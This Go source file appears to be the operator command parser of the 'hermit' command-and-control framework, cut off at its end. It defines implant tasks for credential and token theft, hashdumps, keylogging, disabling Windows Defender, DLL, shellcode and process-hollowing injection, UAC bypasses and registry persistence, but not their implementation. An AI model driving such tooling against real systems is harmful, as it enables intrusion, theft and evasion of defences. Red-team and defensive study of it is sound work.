package parser

import (
	"fmt"
	"strings"

	"github.com/alecthomas/kong"
	cliState "github.com/hideckies/hermit/pkg/client/state"
	"github.com/hideckies/hermit/pkg/common/handler"
	"github.com/hideckies/hermit/pkg/common/meta"
	"github.com/hideckies/hermit/pkg/common/stdin"
	"github.com/hideckies/hermit/pkg/common/stdout"
	servState "github.com/hideckies/hermit/pkg/server/state"
	_task "github.com/hideckies/hermit/pkg/server/task"
)

// ASSEMBLY
type amTaskAssemblyCmd struct {
	Assembly string `arg:"" required:"" help:"Path to .NET assembly to be executed."`
}

func (c *amTaskAssemblyCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"assembly": c.Assembly})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// CAT
type amTaskCatCmd struct {
	Path string `arg:"" required:"" help:"Path to read."`
}

func (c *amTaskCatCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"path": c.Path})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// CD
type amTaskCdCmd struct {
	Path string `arg:"" required:"" help:"Destination path to change."`
}

func (c *amTaskCdCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"path": c.Path})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// CMD
type amTaskCmdCmd struct {
	Cmd string `arg:"" required:"" help:"Command to execute."`
}

func (c *amTaskCmdCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"cmd": c.Cmd})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// CONNECT
type amTaskConnectCmd struct {
	Url string `arg:"" short:"u" required:"" help:"Specify listener URL to connect."`
}

func (c *amTaskConnectCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"url": c.Url})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// CP
type amTaskCpCmd struct {
	Src  string `arg:"" required:"" help:"Source path to copy."`
	Dest string `arg:"" required:"" help:"Destination path to copy."`
}

func (c *amTaskCpCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"src": c.Src, "dest": c.Dest})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// CREDS
type amTaskCredsStealCmd struct{}

func (c *amTaskCredsStealCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(strings.Join(ctx.Args[:2], " "), map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskCredsCmd struct {
	Steal amTaskCredsStealCmd `cmd:"" help:"Steal credentials from various resources on the target computer"`
}

// DISABLE (AV or EDR)
type amTaskDisableAvCmd struct{}

func (c *amTaskDisableAvCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("disable av", map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskDisableCmd struct {
	Av amTaskDisableAvCmd `cmd:"" help:"Disable AV (Widnows Defender)."`
	// Edr amTaskDisableEdrCmd `cmd:"" help:"Disable EDR."`
}

// DLL
type amTaskDllCmd struct {
	File string `short:"f" name:"file" required:"" type:"path" help:"Specify the DLL file path to inject."`
	Pid  uint   `short:"p" name:"pid" required:"" help:"Specify process ID to inject DLL."`
}

func (c *amTaskDllCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	// Select technique
	technique, err := stdin.Select("Technique", []string{
		"dll-injection",
		"reflective-dll-injection",
	})
	if err != nil {
		return err
	}

	task, err := _task.NewTask(ctx.Args[0], map[string]string{
		"dll":       c.File,
		"pid":       fmt.Sprint(c.Pid),
		"technique": technique,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// DOWNLOAD
type amTaskDownloadCmd struct {
	Src  string `arg:"" required:"" help:"Source path to download."`
	Dest string `arg:"" type:"path" required:"" help:"Destination path to download."`
}

func (c *amTaskDownloadCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"src": c.Src, "dest": c.Dest})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// ENV
type amTaskEnvLsCmd struct{}

func (c *amTaskEnvLsCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("env ls", map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskEnvRmCmd struct {
	Var string `arg:"" required:"" help:"Specify the environment variable to remove."`
}

func (c *amTaskEnvRmCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	return nil
}

type amTaskEnvSetCmd struct {
	Var   string `arg:"" required:"" help:"Specify the environmant variable to set."`
	Value string `arg:"" required:"" help:"Specify the value to set."`
}

type amTaskEnvCmd struct {
	Ls amTaskEnvLsCmd `cmd:"" help:"List environment variables."`
	// Rm  amTaskEnvRmCmd  `cmd:"" help:"Remove a specified environment variables."`
	// Set amTaskEnvSetCmd `cmd:"" help:"Set environmant variable."`
}

// FIND
type amTaskFindCmd struct {
	Name string `short:"n" optional:"" help:"Specify the name of files/directories to find."`
	Path string `arg:"" default:"." help:"Specify the path to start finding."`
}

func (c *amTaskFindCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("find", map[string]string{
		"name": c.Name,
		"path": c.Path,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// GROUP
type amTaskGroupAddCmd struct {
	Name string `short:"n" required:"" help:"A name of the new group to create."`
}

func (c *amTaskGroupAddCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("group add", map[string]string{
		"name": c.Name,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskGroupAddUserCmd struct {
	Name     string `short:"n" required:"" help:"A name of the group to add user."`
	Username string `short:"u" required:"" help:"Username to add to the group."`
}

func (c *amTaskGroupAddUserCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("group add-user", map[string]string{
		"name":     c.Name,
		"username": c.Username,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskGroupLsCmd struct{}

func (c *amTaskGroupLsCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("group ls", map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskGroupRmCmd struct {
	Name string `short:"n" required:"" help:"A name of the group to delete."`
}

func (c *amTaskGroupRmCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("group rm", map[string]string{
		"name": c.Name,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskGroupRmUserCmd struct {
	Name     string `short:"n" required:"" help:"A name of the group to delete user."`
	Username string `short:"u" required:"" help:"Username to delete from the group."`
}

func (c *amTaskGroupRmUserCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("group rm-user", map[string]string{
		"name":     c.Name,
		"username": c.Username,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskGroupUsersCmd struct {
	Name string `short:"n" required:"" help:"A name of the group to list users."`
}

func (c *amTaskGroupUsersCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("group users", map[string]string{
		"name": c.Name,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskGroupCmd struct {
	Add     amTaskGroupAddCmd     `cmd:"" help:"Add new group."`
	AddUser amTaskGroupAddUserCmd `cmd:"" help:"Add user to group."`
	Ls      amTaskGroupLsCmd      `cmd:"" help:"List local groups."`
	Rm      amTaskGroupRmCmd      `cmd:"" help:"Delete group."`
	RmUser  amTaskGroupRmUserCmd  `cmd:"" help:"Delete user from group."`
	Users   amTaskGroupUsersCmd   `cmd:"" help:"List users in group."`
}

// HASHDUMP
type amTaskHashdumpCmd struct{}

func (c *amTaskHashdumpCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// HISTORY
type amTaskHistoryCmd struct{}

func (c *amTaskHistoryCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// IP
type amTaskIpCmd struct{}

func (c *amTaskIpCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// JITTER
type amTaskJitterCmd struct {
	Time uint `arg:"" required:"" help:"Specify the time (seconds) for jitter."`
}

func (c *amTaskJitterCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"time": fmt.Sprint(c.Time)})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// KEYLOG
type amTaskKeylogCmd struct {
	Time uint `arg:"" required:"" help:"Specify the time (seconds) for keylogging."`
}

func (c *amTaskKeylogCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"time": fmt.Sprint(c.Time)})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// KILL
type amTaskKillCmd struct{}

func (c *amTaskKillCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// KILLDATE
type amTaskKilldateCmd struct {
	DateTime string `arg:"" required:"" help:"Specify the datetime (e.g. '2025-01-01 00:00:00') to set killdate"`
}

func (c *amTaskKilldateCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	// Parse datetime
	datetimeInt, err := meta.ParseDateTimeInt(c.DateTime)
	if err != nil {
		return err
	}

	task, err := _task.NewTask(ctx.Args[0], map[string]string{"datetime": fmt.Sprint(datetimeInt)})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// LS
type amTaskLsCmd struct {
	Path string `arg:"" default:"." help:"Specify the path to list files."`
}

func (c *amTaskLsCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"path": c.Path})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// MIGRATE
type amTaskMigrateCmd struct {
	Pid uint `arg:"" required:"" help:"Specify the process ID to migrate."`
}

func (c *amTaskMigrateCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"pid": fmt.Sprint(c.Pid)})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// MKDIR
type amTaskMkdirCmd struct {
	Path string `arg:"" required:"" help:"Specify the path to make directory."`
}

func (c *amTaskMkdirCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"path": c.Path})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// MV
type amTaskMvCmd struct {
	Src  string `arg:"" required:"" help:"Specify the source path."`
	Dest string `arg:"" required:"" help:"Specify the destination path."`
}

func (c *amTaskMvCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"src": c.Src, "dest": c.Dest})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// NET
type amTaskNetCmd struct{}

func (c *amTaskNetCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// PE
type amTaskPeCmd struct {
	Pe string `short:"f" name:"file" required:"" type:"path" help:"Specify the PE (Portable Executable) file path to be loaded and executed."`
	// Pid uint   `short:"p" name:"pid" required:"" help:"Specify process ID to inject PE."`
	// Inline bool   `short:"i" optional:"" help:"Enable inline execute."`
}

func (c *amTaskPeCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	// Select technique
	technique, err := stdin.Select("Technique", []string{
		"direct-execution",
		"process-hollowing",
	})
	if err != nil {
		return err
	}
	// Choose target process to be injected
	// *This is used for 'process-hollowing'
	var target_process = "notepad.exe"
	if technique == "process-hollowing" {
		target_process, err = stdin.ReadInput("Process to be Injected", target_process)
		if err != nil {
			return err
		}
	}

	task, err := _task.NewTask(ctx.Args[0], map[string]string{
		"pe":             c.Pe,
		"target_process": target_process,
		"technique":      technique,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// PERSIST
type amTaskPersistCmd struct{}

func (c *amTaskPersistCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	// Select the technique
	items := []string{
		"runkey",
		"user-init-mpr-logon-script",
		"default-file-extension-hijacking",
		"ifeo",
		// "scheduled-task",
		"winlogon",
		// "netsh",
		// "service",
		"(cancel)",
	}
	res, err := stdin.Select("Technique", items)
	if err != nil {
		return err
	}
	if res == "(cancel)" {
		stdout.LogWarn("Canceled")
		return nil
	}

	task, err := _task.NewTask(ctx.Args[0], map[string]string{"technique": res})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// PROCDUMP
type amTaskProcdumpCmd struct {
	Pid uint `arg:"" required:"" help:"Specify the process ID to dump processes."`
}

func (c *amTaskProcdumpCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"pid": fmt.Sprint(c.Pid)})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// PS
type amTaskPsKillCmd struct {
	Pid uint `arg:"" required:"" help:"Specify the process ID to terminate."`
}

func (c *amTaskPsKillCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(strings.Join(ctx.Args[:2], " "), map[string]string{"pid": fmt.Sprint(c.Pid)})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskPsLsCmd struct {
	Filter  string `short:"f" optional:"" help:"Filter processes by specified string."`
	Exclude string `short:"x" optional:"" help:"Exclude processes by sprcified string."`
}

func (c *amTaskPsLsCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(strings.Join(ctx.Args[:2], " "), map[string]string{
		"filter":  c.Filter,
		"exclude": c.Exclude,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskPsCmd struct {
	Kill amTaskPsKillCmd `cmd:"" help:"Terminate a process."`
	Ls   amTaskPsLsCmd   `cmd:"" help:"List processes."`
}

// PWD
type amTaskPwdCmd struct{}

func (c *amTaskPwdCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// REG
type amTaskRegAddCmd struct{}

type amTaskRegQueryCmd struct {
	Path      string `arg:"" required:"" help:"Specify the registry path."`
	Recursive bool   `short:"r" optional:"" help:"List recursively."`
}

func (c *amTaskRegQueryCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	// Split path
	keySplit := strings.Split(c.Path, "\\")
	rootKey := keySplit[0]
	subKey := strings.Join(keySplit[1:], "\\")

	task, err := _task.NewTask(strings.Join(ctx.Args[:2], " "), map[string]string{
		"rootkey":   rootKey,
		"subkey":    subKey,
		"recursive": fmt.Sprintf("%t", c.Recursive),
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskRegRmCmd struct{}

type amTaskRegSaveCmd struct{}

type amTaskRegWriteCmd struct{}

type amTaskRegCmd struct {
	// Add     amTaskRegAddCmd     `cmd:"" help:"Add new registry key."`
	Query amTaskRegQueryCmd `cmd:"" help:"Enumerate subkeys for the specified path."`
	// Rm      amTaskRegRmCmd      `cmd:"" help:"Remove registry key."`
	// Save    amTaskRegSaveCmd    `cmd:"" help:"Save and download registry hives."`
	// Write   amTaskRegWriteCmd   `cmd:"" help:" Write values to the specified registry key"`
}

// RM
type amTaskRmCmd struct {
	Path      string `arg:"" required:"" help:"Specify the path to remove."`
	Recursive bool   `short:"r" optional:"" help:"Remove a directory recursively."`
}

func (c *amTaskRmCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{
		"path":      c.Path,
		"recursive": fmt.Sprintf("%t", c.Recursive),
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// RPORTFWD
type amTaskRportfwdAddCmd struct {
	Shost   string `short:"h" optional:"" default:"${default_bind_addr}" help:"Bind address for server."`
	Sport   uint16 `short:"p" optional:"" default:"8000" help:"Bind port for server."`
	Forward string `arg:"" required:"" help:"Forward setting (format: <LPORT>:<RHOST>:<RPORT>) e.g. '8080:127.0.0.1:8000'."`
}

func (c *amTaskRportfwdAddCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	// Split
	fSplit := strings.Split(c.Forward, ":")
	if len(fSplit) != 3 {
		return fmt.Errorf("invalid forward format")
	}
	// shost := c.Shost
	// sport := c.Sport
	lhost := "127.0.0.1"
	lport := fSplit[0]
	fhost := fSplit[1]
	fport := fSplit[2]

	task, err := _task.NewTask(strings.Join(ctx.Args[:2], " "), map[string]string{
		"lhost": lhost,
		"lport": lport,
		"fhost": fhost,
		"fport": fport,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskRportfwdLsCmd struct{}

func (c *amTaskRportfwdLsCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(strings.Join(ctx.Args[:2], " "), map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskRportfwdRmCmd struct{}

func (c *amTaskRportfwdRmCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(strings.Join(ctx.Args[:2], " "), map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskRportfwdCmd struct {
	Add amTaskRportfwdAddCmd `cmd:"" help:"Add settings to reverse port forwarding."`
	Ls  amTaskRportfwdLsCmd  `cmd:"" help:"List settings for reverse port forwarding."`
	Rm  amTaskRportfwdRmCmd  `cmd:"" help:"Stop and remove listener for reverse port forwarding."`
}

// RUNAS
type amTaskRunasCmd struct {
	Username string `short:"u" required:"" help:"Specify the user."`
	Password string `short:"p" required:"" help:"Specify the user password."`
	Cmd      string `arg:"" required:"" help:"Command to run."`
}

func (c *amTaskRunasCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{
		"username": c.Username,
		"password": c.Password,
		"cmd":      c.Cmd,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// SCREENSHOT
type amTaskScreenshotCmd struct{}

func (c *amTaskScreenshotCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// SHELLCODE
type amTaskShellcodeCmd struct {
	Pid  uint   `short:"p" name:"pid" required:"" help:"Specify a process ID to inject shellcode."`
	File string `short:"f" name:"file" required:"" type:"path" help:"Specify the shellcode file path to inject."`
}

func (c *amTaskShellcodeCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	// Select technique
	technique, err := stdin.Select("Technique", []string{
		"shellcode-injection",
	})
	if err != nil {
		return err
	}

	task, err := _task.NewTask(ctx.Args[0], map[string]string{
		"pid":       fmt.Sprint(c.Pid),
		"shellcode": c.File,
		"technique": technique,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// SLEEP
type amTaskSleepCmd struct {
	Time uint `arg:"" required:"" help:"Specify the time (seconds) to set sleep time."`
}

func (c *amTaskSleepCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{"time": fmt.Sprint(c.Time)})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// SYSINFO
type amTaskSysinfoCmd struct{}

func (c *amTaskSysinfoCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// TOKEN
type amTaskTokenRevertCmd struct{}

func (c *amTaskTokenRevertCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(strings.Join(ctx.Args[:2], " "), map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskTokenStealCmd struct {
	Pid     uint   `short:"p" required:"" help:"Specify process ID to steal token."`
	Process string `optional:"" help:"Specify the process such as 'notepad.exe' to create."`
	Login   bool   `optional:"" help:"If the flag specified, try to impersonate logged-on."`
}

func (c *amTaskTokenStealCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(strings.Join(ctx.Args[:2], " "), map[string]string{
		"pid":     fmt.Sprint(c.Pid),
		"process": c.Process,
		"login":   fmt.Sprintf("%t", c.Login),
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskTokenCmd struct {
	Revert amTaskTokenRevertCmd `cmd:"" help:"Revert back to the original process token."`
	Steal  amTaskTokenStealCmd  `cmd:"" help:"Steal token from the specified process and impersonate process."`
}

func (c *amTaskTokenCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	return nil
}

// UAC
type amTaskUacCmd struct{}

func (c *amTaskUacCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	// Select technique
	technique, err := stdin.Select("Technique", []string{
		"computerdefaults",
		"eventvwr",
		"fodhelper",
		"infinite-uac-prompts",
		"(cancel)",
	})
	if err != nil {
		return err
	}
	if technique == "(cancel)" {
		stdout.LogWarn("Canceled")
		return nil
	}

	task, err := _task.NewTask(ctx.Args[0], map[string]string{
		"technique": technique,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// UPLOAD
type amTaskUploadCmd struct {
	Src  string `arg:"" required:"" type:"path" help:"Specify source path to upload."`
	Dest string `arg:"" required:"" help:"Specify destination path to upload."`
}

func (c *amTaskUploadCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask(ctx.Args[0], map[string]string{
		"src":  c.Src,
		"dest": c.Dest,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

// USER
type amTaskUserAddCmd struct {
	Username string `short:"u" required:"" help:"Set new username."`
	Password string `short:"p" required:"" help:"Set new password."`
}

func (c *amTaskUserAddCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("user add", map[string]string{
		"username": c.Username,
		"password": c.Password,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskUserLsCmd struct{}

func (c *amTaskUserLsCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("user ls", map[string]string{})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskUserRmCmd struct {
	Username string `short:"u" required:"" help:"Username of the account to delete."`
}

func (c *amTaskUserRmCmd) Run(
	ctx *kong.Context,
	serverState *servState.ServerState,
	clientState *cliState.ClientState,
) error {
	task, err := _task.NewTask("user rm", map[string]string{
		"username": c.Username,
	})
	if err != nil {
		return err
	}

	err = handler.HandleAmTaskSet(task, serverState, clientState)
	if err != nil {
		return err
	}
	return nil
}

type amTaskUserCmd struct {
	Add amTaskUserAddCmd `cmd:"" help:"Add new user."`
	Ls  amTaskUserLsCmd  `cmd:"" help:"List users."`
	Rm  amTaskUserRmCmd  `cmd:"" help:"Delete user account."`
}

// WHOAMI
